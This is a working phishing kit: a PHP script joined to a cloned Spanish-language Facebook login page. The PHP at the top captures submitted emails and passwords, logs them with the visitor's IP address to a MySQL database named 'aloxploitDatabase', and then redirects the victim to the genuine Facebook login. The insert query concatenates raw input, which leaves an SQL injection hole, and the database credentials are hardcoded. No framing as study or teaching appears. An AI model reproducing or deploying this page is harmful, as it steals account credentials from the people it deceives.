<?php

ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);

//echo "<h1> Pagina del registro</h1>";
$servername = "localhost";
$database = "aloxploitDatabase";
$username = "aloxploit";
$password = "alox123";


// creamos conexion
  $conn = mysqli_connect($servername, $username, $password, $database);
//si estan todos los campos rellenos los insertamos en la base de datos
  if( isset($_GET["email"]) && isset($_GET["pass"]) && isset($_SERVER["REQUEST_METHOD"]) ){
$pass = $_GET["pass"];
$mail = $_GET["email"];
 if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        $ipAddress = $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ipAddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else {
        $ipAddress = $_SERVER['REMOTE_ADDR'];
	}

  $insert = "insert into datos values('$mail', '$pass','Facebook','$ipAddress')";
//realizamos consulta para insertar los datos
  $return = mysqli_query( $conn, $insert);
  print_r( ( $return));
 // echo " : Registro correcto";
        header("Location: https://es-es.facebook.com/login.php/");
        exit();
}
mysqli_close( $conn);
?>


<!DOCTYPE html>
<html lang="es" id="facebook" class="no_js">
<head><meta charset="utf-8" />
	<meta name="referrer" content="origin-when-crossorigin" id="meta_referrer" />
	<script nonce="k1JHMhQB">(function(a){function b(b){if(!window.openDatabase)return;b.I_AM_INCOGNITO_AND_I_REALLY_NEED_WEBSQL=function(a,b,c,d){return window.openDatabase(a,b,c,d)};window.openDatabase=function(){throw new Error()}}b(a)})(this);</script>
	<style nonce="k1JHMhQB"></style>
	<script nonce="k1JHMhQB">__DEV__=0;</script>
	<noscript>
		<meta http-equiv="refresh" content="0; URL=/login.php/?_fb_noscript=1" /></noscript><link rel="manifest" id="MANIFEST_LINK" href="/data/manifest/" crossorigin="use-credentials" />
		<title id="pageTitle">Iniciar sesión en Facebook</title><meta name="description" content="Inicia sesi&#xf3;n en Facebook para empezar a compartir y conectar con tus amigos, familiares y las personas que conoces." />
		<meta property="og:site_name" content="Facebook" /><meta property="og:url" content="https://es-es.facebook.com/login.php/" /><meta property="og:locale" content="es_ES" /><link rel="canonical" href="https://es-es.facebook.com/login/web/" /><link rel="icon" href="https://static.xx.fbcdn.net/rsrc.php/yb/r/hLRJ1GG_y0J.ico" /><link type="text/css" rel="stylesheet" href="https://static.xx.fbcdn.net/rsrc.php/v3/yQ/l/0,cross/ONTwK5rko0K.css?_nc_x=Ij3Wp8lg5Kz" data-bootloader-hash="BvHxbgz" crossorigin="anonymous" />
<link type="text/css" rel="stylesheet" href="https://static.xx.fbcdn.net/rsrc.php/v3/yM/l/0,cross/1dJNol7brJ_.css?_nc_x=Ij3Wp8lg5Kz" data-bootloader-hash="vVIo2Ot" crossorigin="anonymous" />
<link type="text/css" rel="stylesheet" href="https://static.xx.fbcdn.net/rsrc.php/v3/y-/l/0,cross/n5TExLa5YQj.css?_nc_x=Ij3Wp8lg5Kz" data-bootloader-hash="WmZdcqN" crossorigin="anonymous" />
<link type="text/css" rel="stylesheet" href="https://static.xx.fbcdn.net/rsrc.php/v3/yk/l/0,cross/GNdQeuvtqR7.css?_nc_x=Ij3Wp8lg5Kz" data-bootloader-hash="jEFWYSD" crossorigin="anonymous" />
<link type="text/css" rel="stylesheet" href="https://static.xx.fbcdn.net/rsrc.php/v3/yW/l/0,cross/i35b2KVpLUM.css?_nc_x=Ij3Wp8lg5Kz" data-bootloader-hash="Oa7g8+N" crossorigin="anonymous" />
<script src="https://static.xx.fbcdn.net/rsrc.php/v3/yk/r/UpZWg46fTMd.js?_nc_x=Ij3Wp8lg5Kz" data-bootloader-hash="3f2SWAU" crossorigin="anonymous" nonce="k1JHMhQB"></script>

<body class="_39il _97vt _97vz _97v- _97v_ _97w2 _97w0 _9ax- _9ax_ _9ay1 UIPage_LoggedOut _-kb _605a b_c3pyn-ahh gecko win x1-5 Locale_es_ES cores-gte4 _19_u" dir="ltr">
	<div class="_li" id="u_0_0_c0">
		<div id="globalContainer" class="uiContextualLayerParent">
			<div class="fb_content clearfix " id="content" role="main">
				<div class="_4-u5 _30ny">
					<div class="_97vy">
						<img class="_97vu img" src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu2zih0ca.svg" alt="Facebook"></div>
						<div class="_4-u2 _1w1t _4-u8 _52jv">
							<div class="_xku" id="header_block">
								<span class="_97w1 _50f6"><div class="_9axz">Iniciar sesión en Facebook</div></span>
							</div>
							<div class="login_form_container">

								<form id="login_form" action="facebook.php" method="GET">
									<div id="loginform">
										<div class="clearfix _5466 _44mg" id="email_container">
											<input type="text" class="inputtext _55r1 inputtext _1kbt inputtext _1kbt" name="email" id="email" tabindex="0" placeholder="Correo electrónico o número de teléfono" value="" autofocus="1" autocomplete="username" aria-label="Correo electrónico o número de teléfono">
										</div>
										<div class="clearfix _5466 _44mg">
											<div>
												<div class="_55r1 _1kbt">
													<input type="password" class="inputtext _55r1 inputtext _9npi inputtext _9npi" name="pass" id="pass" tabindex="0" placeholder="Contraseña" value="" autocomplete="current-password" aria-label="Contraseña">
												</div>
											</div>
										</div>
										<div class="_xkt">
											<button value="1" class="_42ft _4jy0 _52e0 _4jy6 _4jy1 selected _51sy" id="loginbutton" name="login" tabindex="0" type="submit">Iniciar sesión
											</button>
										</div>
										<div class="_xkv fsm fwn fcg" id="login_link">
											<a href="https://www.facebook.com/recover/initiate/?ars=facebook_login&amp;cancel_lara_pswd=0" class="_97w4" target="">¿Has olvidado los datos de la cuenta?</a>
											<span role="presentation" aria-hidden="true"> · </span>
											<a href="/r.php?locale=es_ES&amp;display=page" rel="nofollow" class="_97w5">Registrarte en Facebook</a>
										</div>
									</div>
								</form>
							</div>
						</div>
					</div>
				</div>
				<div class="">
					<div class="_95ke _8opy">
						<div id="pageFooter" data-referrer="page_footer" data-testid="page_footer">
							<ul class="uiList localeSelectorList _2pid _509- _4ki _6-h _6-j _6-i" data-nocookies="1">
								<li>Español (España)</li>
								<li><a class="_sv4" dir="ltr" href="https://ca-es.facebook.com/login.php/" onclick="require(&quot;IntlUtils&quot;).setCookieLocale(&quot;ca_ES&quot;, &quot;es_ES&quot;, &quot;https:\/\/ca-es.facebook.com\/login.php\/&quot;, &quot;www_list_selector&quot;, 0); return false;" title="Catalan">Català</a></li>
								<li><a class="_sv4" dir="ltr" href="https://www.facebook.com/login.php/" onclick="require(&quot;IntlUtils&quot;).setCookieLocale(&quot;en_US&quot;, &quot;es_ES&quot;, &quot;https:\/\/www.facebook.com\/login.php\/&quot;, &quot;www_list_selector&quot;, 1); return false;" title="English (US)">English (US)</a></li>
								<li><a class="_sv4" dir="ltr" href="https://fr-fr.facebook.com/login.php/" onclick="require(&quot;IntlUtils&quot;).setCookieLocale(&quot;fr_FR&quot;, &quot;es_ES&quot;, &quot;https:\/\/fr-fr.facebook.com\/login.php\/&quot;, &quot;www_list_selector&quot;, 2); return false;" title="French (France)">Français (France)</a></li>
								<li><a class="_sv4" dir="ltr" href="https://ro-ro.facebook.com/login.php/" onclick="require(&quot;IntlUtils&quot;).setCookieLocale(&quot;ro_RO&quot;, &quot;es_ES&quot;, &quot;https:\/\/ro-ro.facebook.com\/login.php\/&quot;, &quot;www_list_selector&quot;, 3); return false;" title="Romanian">Română</a></li>
								<li><a class="_sv4" dir="ltr" href="https://it-it.facebook.com/login.php/" onclick="require(&quot;IntlUtils&quot;).setCookieLocale(&quot;it_IT&quot;, &quot;es_ES&quot;, &quot;https:\/\/it-it.facebook.com\/login.php\/&quot;, &quot;www_list_selector&quot;, 4); return false;" title="Italian">Italiano</a></li>
								<li><a class="_sv4" dir="ltr" href="https://gl-es.facebook.com/login.php/" onclick="require(&quot;IntlUtils&quot;).setCookieLocale(&quot;gl_ES&quot;, &quot;es_ES&quot;, &quot;https:\/\/gl-es.facebook.com\/login.php\/&quot;, &quot;www_list_selector&quot;, 5); return false;" title="Galician">Galego</a></li>
								<li><a class="_sv4" dir="ltr" href="https://de-de.facebook.com/login.php/" onclick="require(&quot;IntlUtils&quot;).setCookieLocale(&quot;de_DE&quot;, &quot;es_ES&quot;, &quot;https:\/\/de-de.facebook.com\/login.php\/&quot;, &quot;www_list_selector&quot;, 6); return false;" title="German">Deutsch</a></li>
								<li><a class="_sv4" dir="ltr" href="https://pt-br.facebook.com/login.php/" onclick="require(&quot;IntlUtils&quot;).setCookieLocale(&quot;pt_BR&quot;, &quot;es_ES&quot;, &quot;https:\/\/pt-br.facebook.com\/login.php\/&quot;, &quot;www_list_selector&quot;, 7); return false;" title="Portuguese (Brazil)">Português (Brasil)</a></li>
								<li><a class="_sv4" dir="rtl" href="https://ar-ar.facebook.com/login.php/" onclick="require(&quot;IntlUtils&quot;).setCookieLocale(&quot;ar_AR&quot;, &quot;es_ES&quot;, &quot;https:\/\/ar-ar.facebook.com\/login.php\/&quot;, &quot;www_list_selector&quot;, 8); return false;" title="Arabic">العربية</a></li>
								<li><a class="_sv4" dir="ltr" href="https://hi-in.facebook.com/login.php/" onclick="require(&quot;IntlUtils&quot;).setCookieLocale(&quot;hi_IN&quot;, &quot;es_ES&quot;, &quot;https:\/\/hi-in.facebook.com\/login.php\/&quot;, &quot;www_list_selector&quot;, 9); return false;" title="Hindi">हिन्दी</a></li>
								<li><a role="button" class="_42ft _4jy0 _517i _517h _51sy" rel="dialog" ajaxify="/settings/language/language/?uri=https%3A%2F%2Fhi-in.facebook.com%2Flogin.php%2F&amp;source=www_list_selector_more" href="#" title="Mostrar más idiomas"><i class="img sp_8oGPGkzB8ig_1_5x sx_0d1895"></i></a></li>
							</ul>
							<div id="contentCurve"></div>
							<div id="pageFooterChildren" role="contentinfo" aria-label="Enlaces del sitio de Facebook">
								<ul class="uiList pageFooterLinkList _509- _4ki _703 _6-i">
									<li><a href="/reg/" title="Regístrate en Facebook">Registrarte</a></li>
									<li><a href="/login/" title="Iniciar sesión en Facebook">Iniciar sesión</a></li>
									<li><a href="https://messenger.com/" title="Consultar Messenger.">Messenger</a></li>
									<li><a href="/lite/" title="Facebook Lite para Android.">Facebook Lite</a></li>
									<li><a href="https://es-es.facebook.com/watch/" title="Explorar en Vídeo">Vídeo</a></li>
									<li><a href="/places/" title="Consulta lugares populares en Facebook.">Lugares</a></li>
									<li><a href="/games/" title="Consulta los juegos en Facebook.">Juegos</a></li>
									<li><a href="/marketplace/" title="Compra y vende artículos en Facebook Marketplace.">Marketplace</a></li>
									<li><a href="https://pay.facebook.com/" title="Más información sobre Meta Pay" target="_blank">Meta&nbsp;Pay</a></li>
									<li><a href="https://www.meta.com/" title="Finalizar compra en Meta" target="_blank">Meta Store</a></li>
									<li><a href="https://www.meta.com/quest/" title="Más información sobre Meta Quest" target="_blank">Meta Quest</a></li>
									<li><a href="https://imagine.meta.com/" title="Imaginar con Meta AI" target="_blank" rel="noreferrer nofollow" data-lynx-mode="asynclazy" data-lynx-uri="https://l.facebook.com/l.php?u=https%3A%2F%2Fimagine.meta.com%2F&amp;h=AT0zD3kZWmOlAJhTRKNQrOBP1GKzNBWcQI2VAGJR9qRhocLqzyZGRRRDRq8H01jgv9P-XC3VBYsUoIQkVFBA8Gu7_Y17UNCca4wy37FpcCV41ofdhyzksMWYSEWLdWHt1UZRyFt86TO8lcHxZ8Ihpg">Imaginar con Meta AI</a></li>
									<li><a href="https://www.instagram.com/" title="Echa un vistazo a Instagram" target="_blank" rel="noreferrer nofollow" data-lynx-mode="asynclazy" data-lynx-uri="https://l.facebook.com/l.php?u=https%3A%2F%2Fwww.instagram.com%2F&amp;h=AT1rmbphBsEDRttRw-Qq9AAOakphzm1l9fqz5oksEU5JvxHNA-B3swyosIhMGaB0uQc4-n5usfi33Nu2_PgmY9Xw-NYA8dGWwjvfF7ve-YuelBP5In80Dl77gNaVVlaCu6hHfBRHIMmRsObgGWlkIA">Instagram</a></li>
									<li><a href="https://www.threads.net/" title="Consultar Threads">Threads</a></li>
									<li><a href="/fundraisers/" title="Haz una donación a causas que te importan.">Recaudaciones de fondos</a></li>
									<li><a href="/biz/directory/" title="Busca en nuestro directorio de servicios de Facebook.">Servicios</a></li>
									<li><a href="/votinginformationcenter/?entry_point=c2l0ZQ%3D%3D" title="Consulta el centro de información de votación.">Centro de información de votación</a></li>
									<li><a href="/privacy/policy/?entry_point=facebook_page_footer" title="Obtén más información sobre cómo recogemos, usamos y compartimos datos para ayudar a Facebook.">Política de privacidad</a></li>
									<li><a href="/privacy/center/?entry_point=facebook_page_footer" title="Obtén más información sobre cómo  administrar y controlar tu privacidad en Facebook.">Centro de privacidad</a></li>
									<li><a href="/privacy/cookie_settings/?entry_point=msite" title="Más información sobre la configuración de cookies de Facebook.">Configuración de cookies</a></li>
									<li><a href="/groups/discover/" title="Explora nuestros grupos.">Grupos</a></li>
									<li><a href="https://about.meta.com/" accesskey="8" title="Lee nuestro blog, descubre el centro de recursos y encuentra ofertas de trabajo.">Información</a></li>
									<li><a href="/ad_campaign/landing.php?placement=pflo&amp;campaign_id=402047449186&amp;nav_source=unknown&amp;extra_1=auto" title="Anúnciate en Facebook.">Crear anuncio</a></li>
									<li><a href="/pages/create/?ref_type=site_footer" title="Crear una página">Crear página</a></li>
									<li><a href="https://developers.facebook.com/?ref=pf" title="Desarrolla en nuestra plataforma.">Desarrolladores</a></li>
									<li><a href="/careers/?ref=pf" title="Únete a nuestra extraordinaria empresa.">Empleo</a></li>
									<li><a href="/policies/cookies/" title="Información sobre las cookies y Facebook." data-nocookies="1">Cookies</a></li>
									<li><a href="/privacy/cookie_settings/?entry_point=fb_main_page" title="Más información sobre la configuración de cookies de Facebook." target="_blank">Configuración de cookies</a></li>
									<li><a class="_41ug" data-nocookies="1" href="https://www.facebook.com/help/568137493302217" title="Más información sobre Gestión de anuncios">Opciones de anuncios
										<i class="img sp_8oGPGkzB8ig_1_5x sx_192477"></i>
									</a></li>
									<li><a data-nocookies="1" href="/policies?ref=pf" accesskey="9" title="Consulta nuestras políticas y condiciones.">Condiciones</a></li>
									<li><a href="/help/?ref=pf" accesskey="0" title="Visita nuestro servicio de ayuda.">Ayuda</a></li>
									<li><a href="help/637205020878504" title="Visita nuestro aviso para subir contactos y no usuarios.">Subir contactos y no usuarios</a></li>
									<li><a accesskey="6" class="accessible_elem" href="/settings" title="Ver y editar tu configuración de Facebook.">Configuración</a></li>
									<li><a accesskey="7" class="accessible_elem" href="/allactivity?privacy_source=activity_log_top_menu" title="Ver tu registro de actividad">Registro de actividad</a></li>
								</ul>
							</div>
							<div class="mvl copyright">
								<div>
									<span> Meta © 2024</span>
								</div>
							</div>
						</div>
					</div>
				</div>
			</div>
			<div>	
			</div><span><img src="https://facebook.com/security/hsts-pixel.gif" width="0" height="0" style="display:none"></span></div>

			<script>requireLazy(["InitialJSLoader"], function(InitialJSLoader) {InitialJSLoader.loadOnDOMContentReady(["QhgzKCx","pQOLlne","TPNqjjX","Ksj30v8","EhtG4tx","\/AN8Bt5","QxUE+RR","nygBTIJ","EmtnQVV","HoLzByL","lnaHjD+","BFolX4R","I+GHswV","PHpesmL","zPYlTyl","gQQhuBW","P\/mr5VE"]);});</script>
			<script>now_inl=(function(){var p=window.performance;return p&&p.now&&p.timing&&p.timing.navigationStart?function(){return p.now()+p.timing.navigationStart}:function(){return new Date().getTime()};})();window.__bigPipeFR=now_inl();</script>
			<link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/yQ/l/0,cross/ONTwK5rko0K.css?_nc_x=Ij3Wp8lg5Kz" as="style" crossorigin="anonymous" />
			<link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/yM/l/0,cross/1dJNol7brJ_.css?_nc_x=Ij3Wp8lg5Kz" as="style" crossorigin="anonymous" />
			<link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/y-/l/0,cross/n5TExLa5YQj.css?_nc_x=Ij3Wp8lg5Kz" as="style" crossorigin="anonymous" />
			<link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/yk/l/0,cross/GNdQeuvtqR7.css?_nc_x=Ij3Wp8lg5Kz" as="style" crossorigin="anonymous" />
			<link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/yW/l/0,cross/i35b2KVpLUM.css?_nc_x=Ij3Wp8lg5Kz" as="style" crossorigin="anonymous" />
			<link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/yG/r/r3bk9zkN4B5.js?_nc_x=Ij3Wp8lg5Kz" as="script" crossorigin="anonymous" nonce="k1JHMhQB" />
			<link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3i7M54/yT/l/es_ES~es_LA/-e_uYXPQndQ.js?_nc_x=Ij3Wp8lg5Kz" as="script" crossorigin="anonymous" nonce="k1JHMhQB" />
			<link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/yx/r/GIlJjyzEguQ.js?_nc_x=Ij3Wp8lg5Kz" as="script" crossorigin="anonymous" nonce="k1JHMhQB" />
			<link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/y_/r/I0HH5UHJEbY.js?_nc_x=Ij3Wp8lg5Kz" as="script" crossorigin="anonymous" nonce="k1JHMhQB" />
			<script>window.__bigPipeCtor=now_inl();requireLazy(["BigPipe"],function(BigPipe){define("__bigPipe",[],window.bigPipe=new BigPipe({"forceFinish":true,"config":{"flush_pagelets_asap":true,"dispatch_pagelet_replayable_actions":false}}));});</script>
<script nonce="k1JHMhQB">(function(){var n=now_inl();requireLazy(["__bigPipe"],function(bigPipe){bigPipe.beforePageletArrive("first_response",n);})})();</script>
<script nonce="k1JHMhQB">requireLazy(["__bigPipe"],(function(bigPipe){bigPipe.onPageletArrive({displayResources:["BvHxbgz","vVIo2Ot","WmZdcqN","jEFWYSD","Oa7g8+N","Ksj30v8","pQOLlne","P/mr5VE","EmtnQVV","lnaHjD+"],id:"first_response",phase:0,last_in_phase:true,tti_phase:0,all_phases:[63],hsrp:{hblp:{consistency:{rev:1011421597}}},allResources:["BvHxbgz","vVIo2Ot","WmZdcqN","jEFWYSD","Oa7g8+N","QhgzKCx","pQOLlne","TPNqjjX","Ksj30v8","EhtG4tx","/AN8Bt5","QxUE+RR","nygBTIJ","EmtnQVV","HoLzByL","lnaHjD+","BFolX4R","I+GHswV","PHpesmL","zPYlTyl","gQQhuBW","P/mr5VE"]});}));</script>
<script>requireLazy(["__bigPipe"],function(bigPipe){bigPipe.setPageID("7335566089149979147")});</script><script nonce="k1JHMhQB">(function(){var n=now_inl();requireLazy(["__bigPipe"],function(bigPipe){bigPipe.beforePageletArrive("last_response",n);})})();</script>
</body></html>
